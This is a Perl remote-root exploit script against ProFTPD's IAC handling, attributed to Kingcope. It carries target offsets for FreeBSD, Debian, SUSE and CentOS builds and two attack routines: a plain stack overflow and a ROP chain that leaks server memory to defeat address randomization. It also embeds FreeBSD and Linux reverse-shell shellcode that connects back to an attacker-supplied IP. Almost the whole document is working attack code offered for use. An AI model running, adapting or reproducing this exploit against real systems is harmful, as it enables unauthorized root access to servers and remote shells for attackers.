# Exploit Title: ProFTPD IAC Remote Root Exploit
# Date: 7 November 2010
# Author: Kingcope

use IO::Socket;

$numtargets = 13;

@targets =
( 
 # Plain Stack Smashing
 
 #Confirmed to work
 ["FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)",# PLATFORM SPEC
 	"FreeBSD",	# OPERATING SYSTEM
 	0,			# EXPLOIT STYLE
 	0xbfbfe000,	# OFFSET START
 	0xbfbfff00,	# OFFSET END
 	1029],		# ALIGN
 
 #Confirmed	to work
 ["FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)",
 	"FreeBSD",
 	0,
 	0xbfbfe000,
 	0xbfbfff00,
 	1021],
 	
 # Return into Libc
 
 #Confirmed to work
 ["Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,			# EXPLOIT STYLE
 	0x0804CCD4,	# write(2) offset
 	8189,		# ALIGN
 	0], 		# PADDING

 # Confirmed to work
 ["Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804D23C,
 	4101,
 	0],
 
 #Confirmed to work
 ["Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,			
 	0x0804C9A4,	
 	8189,
 	0], 		
 #Confirmed to work	
 ["Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)",
 	"Linux",
 	1,			
 	0x080532D8,	
 	4101,
 	12],
 	
 ["SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804C9C4,
 	8189,
 	0],

 ["SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CAA8,
 	8189,
 	0],
 	
 ["SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CBBC,
 	8189,
 	0],

 ["SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CCBC,
 	8189,
 	0], 

 #Confirmed to work
 ["SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CCE0,
 	8189,
 	0], 	

 ["SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804CA2C,
 	8189,
 	0], 

 #Confirmed to work
 ["CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)",
 	"Linux",
 	1,
 	0x0804C290,
 	8189,
 	0],
	
 	# feel free to add more targets.
);

#freebsd reverse shell port 45295
#setup a netcat on this port ^^
$bsdcbsc =
		# setreuid
        "\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80".
		# connect back :>
		"\x31\xc0\x31\xdb\x53\xb3\x06\x53".
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0".
        "\x61\xcd\x80\x31\xd2\x52\x52\x68".
        "\x41\x41\x41\x41\x66\x68\xb0\xef".
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10".
        "\x52\x51\x50\x52\x89\xc2\x31\xc0".
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3".
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80".
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd".
        "\x80\x31\xc0\x31\xdb\x43\x53\x52".
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43".
        "\x53\x52\x50\xb0\x5a\xcd\x80\x31".
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68".
        "\x2f\x62\x69\x6e\x89\xe3\x50\x54".
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0".
        "\xb0\x01\xcd\x80";

#linux reverse shell port 45295 by bighawk
#setup a netcat on this port ^^
$lnxcbsc =
# setreuid
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90".
# connect back :>
"\x6a\x66".
"\x58".
"\x6a\x01".
"\x5b".    
"\x31\xc9".
"\x51".
"\x6a\x01".
"\x6a\x02".
"\x89\xe1".
"\xcd\x80".
"\x68\x7f\x7f\x7f\x7f". # IP
"\x66\x68\xb0\xef". # PORT
"\x66\x6a\x02".
"\x89\xe1".
"\x6a\x10".    
"\x51".    
"\x50".        
"\x89\xe1".
"\x89\xc6".    
"\x6a\x03".    
"\x5b".    
"\x6a\x66".
"\x58".    
"\xcd\x80".
"\x87\xf3".    
"\x6a\x02".    
"\x59".    
"\xb0\x3f".
"\xcd\x80".    
"\x49".    
"\x79\xf9".
"\xb0\x0b".    
"\x31\xd2".    
"\x52".    
"\x68\x2f\x2f\x73\x68".
"\x68\x2f\x62\x69\x6e".
"\x89\xe3".
"\x52".            
"\x53".                
"\x89\xe1".
"\xcd\x80";

sub exploit1 {
    for ($counter=$targets[$ttype][3]; $counter < $targets[$ttype][4]; $counter += 250) {
		printf("[$target] CURRENT OFFSET = %08x :pP\n", $counter);
		$ret = pack("V", $counter);
		$align = $targets[$ttype][5];

		my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          		 PeerPort => 21,
           		                  		 Proto    => 'tcp');

		$stack = "KCOPERULEZKCOPERULEZKC" . $ret . "\x90" x 500 . $shellcode . "A" x 10;

		$v = <$sock>;
	
		print $sock "\x00" x $align . "\xff" . $stack . "\n";
	
		close($sock);		    
	}    
}

# Linux technique to retrieve a rootshell (C) kingcope 2010
#
# uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)
# only the write(2) plt entry offset is needed for the exploit to work (and of course the
# align value)
# once the correct write value is given to the exploit it fetches the memory space of proftpd.
# with this information the exploit can find function entries and byte values
# relative to the write(2) address.
# once the memory is read out the exploit does the following to circumvent linux adress space
# randomization:
# 
# 1.) calculate mmap64() plt entry
# 2.) seek for assembly instructions in the proftpd memory space relative to write(2)
#     such as pop pop ret instructions
# 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute
# 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine
# 4.) copy known assembly instructions (which have been found before using the memory read)
#     to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100
#     and make use of the memcpy found before
# 5.) actually jump to the shellcode finder
# 6.) once the shellcode has been copied to 0x10000100 jump to it
# 7.) shellcode gets executed and we have our desired root shell.

sub exploit2 {
	printf("[$target] %s :pP\n", $targets[$ttype][0]);
	$align = $targets[$ttype][4];
	$write_offset = $targets[$ttype][3];
	$padding = $targets[$ttype][5];
		
	$|=1;
	print "align = $align\n";
	print "Seeking for write(2)..\n";
	
	#known good write(2) values
	#0x0804C290
	#0x0804A85C
	#0x0804A234
	#0x08052830
	#080532D8 proftpd-basic_1.3.3a-4_i386
	#08052938 proftpd-basic_1.3.2e-4_i386 (ubunutu)
	#0804CCD4 psa-proftpd_1.3.2e-debian5.0.build95100504.17_i386 !!

	printf "Using write offset %08x.\n", $write_offset;
	$k = $write_offset;
	$sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');

	$sock->sockopt(SO_LINGER, pack("ii", 1, 0));
	#$x = <stdin>;
	$stack = "KCOPERULEZKCOPERULEZKC". "C" x $padding . 
			 pack("V", $k).  # write
			 "\xcc\xcc\xcc\xcc".
			 "\x01\x00\x00\x00".	# fd for write
			 pack("V", $k). # buffer for write
			 "\xff\xff\x00\x00";	# length for write

	$v = <$sock>;
	
	print $sock "\x00" x $align . "\xff" . $stack . "\n";
	
	vec ($rfd, fileno($sock), 1) = 1;

	$timeout = 2;
    if (select ($rfd, undef, undef, $timeout) >= 0
             && vec($rfd, fileno($sock), 1))
    {
       if (read($sock, $buff, 0xffff) == 0xffff) {
		printf "\nSUCCESS. write(2) is at %08x\n", $k;	
		close($sock);
		goto lbl1;
		}
    }
    
	close($sock);
	printf "wrong write(2) offset.\n";
	exit;

lbl1:
#	Once we're here chances are good that we get the root shell

	print "Reading memory from server...\n";
	my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');	
	
	$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding . 
			 pack("V", $k).  # write
			 "\xcc\xcc\xcc\xcc".
			 "\x01\x00\x00\x00".	# fd for write
			 pack("V", $k). # buffer for write
			 "\xff\xff\x0f\x00";	# length for write

	$v = <$sock>;
	
	print $sock "\x00" x $align . "\xff" . $stack . "\n"; 
	
	read($sock, $buff, 0xfffff);

	if (($v = index $buff, "\x5E\x5F\x5D") >= 0) {
		$pop3ret = $k + $v;
		printf "pop pop pop ret located at %08x\n", $pop3ret;
	} else {
		print "Could not find pop pop pop ret\n";
		exit;
	}
	
	if (($v = index $buff, "\x83\xC4\x20\x5B\x5E\x5D\xC3") >= 0) {
		$largepopret = $k + $v;
		printf "large pop ret located at %08x\n", $largepopret;
	} else {
		print "Could not find pop pop pop ret\n";
		exit;
	}

	if (($v = index $buff, "\xC7\x44\x24\x08\x03\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x89\x44\x24\x04") >= 0) {
		$addr1 = $k+$v+23;
		
		$mmap64 = unpack("I", substr($buff, $v+20, 4));
		$mmap64 = $addr1 - (0xffffffff-$mmap64);
		printf "mmap64 is located at %08x\n", $mmap64;
	} else {
		if (($v = index $buff, "\x89\x44\x24\x10\xA1\xBC\xA5\x0F\x08\x89\x44\x24\x04\xe8") >= 0) {
			$addr1 = $k+$v+17;
		
			$mmap64 = unpack("I", substr($buff, $v+14, 4));
			$mmap64 = $addr1 - (0xffffffff-$mmap64);
			printf "mmap64 is located at %08x\n", $mmap64;
		} else {
			print "Could not find mmap64()\n";
			exit;
		}
	}
	
		
		
		if (($v = index $buff, "\x8D\x45\xF4\x89\x04\x24\x89\x54\x24\x08\x8B\x55\x08\x89\x54\x24\x04\xE8") >= 0) {
			$addr1 = $k+$v+21;
			$memcpy = unpack("I", substr($buff, $v+18, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {		
		
		if (($v = index $buff, "\x8B\x56\x10\x89\x44\x24\x08\x89\x54\x24\x04\x8B\x45\xE4\x89\x04\x24\xe8") >= 0) {
			$addr1 = $k+$v+21;
		
			$memcpy = unpack("I", substr($buff, $v+18, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {
		if (($v = index $buff, "\x89\x44\x24\x04\xA1\xBC\x9F\x0E\x08\x89\x04\x24") >= 0) {
			$addr1 = $k+$v+16;
		
			$memcpy = unpack("I", substr($buff, $v+13, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {
		if (($v = index $buff, "\x89\x7C\x24\x04\x89\x1C\x24\x89\x44\x24\x08") >= 0) {
			$addr1 = $k+$v+15;
		
			$memcpy = unpack("I", substr($buff, $v+12, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
	
		}	 else {
		if (($v = index $buff, "\x8B\x55\x10\x89\x74\x24\x04\x89\x04\x24\x89\x54\x24\x08") >= 0) {
			$addr1 = $k+$v+18;
			$memcpy = unpack("I", substr($buff, $v+15, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {
			
			print "Could not find memcpy()\n";
			exit;	
		}
		}
		}
		}	
	}
	
	if (($v = index $buff, "\xfc\x8b") >= 0) {
		$byte1 = $k+$v;
		printf ("byte1: %08x\n", $byte1);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\xf4") >= 0) {
		$byte2 = $k+$v;
		printf ("byte2: %08x\n", $byte2);
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\xbf") >= 0) {
		$byte3 = $k+$v;
		printf ("byte3: %08x\n", $byte3);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\x00\x01\x00") >= 0) {
		$byte4 = $k+$v;
		printf ("byte4: %08x\n", $byte4);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}

	if (($v = index $buff, "\x10") >= 0) {
		$byte5 = $k+$v;
		printf ("byte5: %08x\n", $byte5);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\xB9\x00\x02\x00\x00") >= 0) {
		$byte6 = $k+$v;
		printf ("byte6: %08x\n", $byte6);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	

	if (($v = index $buff, "\xf3") >= 0) {
		$byte7 = $k+$v;
		printf ("byte7: %08x\n", $byte7);	
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\xA4") >= 0) {
		$byte8 = $k+$v;
		printf ("byte8: %08x\n", $byte8);
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
	if (($v = index $buff, "\xeb\xff") >= 0) {
		$byte9 = $k+$v;
		printf ("byte9: %08x\n", $byte9);
	} else {
		print "Could not find a special byte\n";
		exit;	
	}
	
# shellcode copy routine:
#0100740B     FC             CLD
#0100740C     8BF4           MOV ESI,ESP
#0100740E     BF 00010010    MOV EDI,10000100
#01007413     B9 00020000    MOV ECX,200
#01007418     F3:A4          REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
#			  EB FF 		 JMP +0xFF		
# FC 8B	
# F4 BF
# 00 01 00
# 10
# B9 00 02 00 00
# F3:A4
# EB FF

# El1Te X-Ploit TechNiqUe (C)

	print "Building exploit buffer\n";

	$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding . 
			 pack("V", $mmap64). # mmap64()
			 pack("V", $largepopret). # add     esp, 20h; pop; pop
			 "\x00\x00\x00\x10". # mmap start
			 "\x00\x10\x00\x00". # mmap size
			 "\x07\x00\x00\x00". # mmap prot
			 "\x32\x00\x00\x00". # mmap flags
			 "\xff\xff\xff\xff". # mmap fd
			 "\x00\x00\x00\x00". # mmap offset
			 "\x00\x00\x00\x00". # mmap offset			 
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x00\x00\x00\x10". # destination
			 pack("V", $byte1). # origin
			 "\x02\x00\x00\x00". # number of bytes to copy
			 
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x02\x00\x00\x10". # destination
			 pack("V", $byte2). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x03\x00\x00\x10". # destination
			 pack("V", $byte3). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy
			 			 
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x04\x00\x00\x10". # destination
			 pack("V", $byte4). # origin
			 "\x03\x00\x00\x00". # number of bytes to copy
			 
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x07\x00\x00\x10". # destination
			 pack("V", $byte5). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy
			 
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x08\x00\x00\x10". # destination
			 pack("V", $byte6). # origin
			 "\x05\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0d\x00\x00\x10". # destination
			 pack("V", $byte7). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0e\x00\x00\x10". # destination
			 pack("V", $byte8). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy
			 
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0f\x00\x00\x10". # destination
			 pack("V", $byte9). # origin
			 "\x02\x00\x00\x00". # number of bytes to copy
			 
			 "\x00\x00\x00\x10". # JUMP TO 0x10000000 rwxp address			 

			 "\x90" x 100 . $shellcode . "\x90" x 10;		
	
	print "Sending exploit buffer!\n";
	
	my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');				 
	$v = <$sock>;

	print $sock "\x00" x $align . "\xff" . $stack . "\n";
	
	print "Check your netcat?\n";
	
	while(<$sock>) {
		print;	
	}			 
}

sub usage() {
	print "written by kingcope\n";
 	print "usage:\n".
 		  "proremote.pl <target ip/host> <your ip> <target type>\n\n";
    for ($i=0; $i<$numtargets; $i++) {
  		print "\t[".$i."]\t". $targets[$i][0]. "\r\n";
    }
 		  
	exit;
}

if ($#ARGV ne 2) { usage; }

$target = $ARGV[0];
$cbip = $ARGV[1];
$ttype = $ARGV[2];

$platform = $targets[$ttype][1];
$style = $targets[$ttype][2];

($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));

if ($platform eq "FreeBSD") {
	$shellcode = $bsdcbsc;
	substr($shellcode, 37, 4, $a1 . $a2 . $a3 . $a4);
} else { 
if ($platform eq "Linux") {
	$shellcode = $lnxcbsc;
	substr($shellcode, 31, 4, $a1 . $a2 . $a3 . $a4);
} else {
	print "typo ?\n";
	exit;
}}

if ($style eq 0) {
	exploit1;
} else {
	exploit2;	
}

print "done.\n";
exit;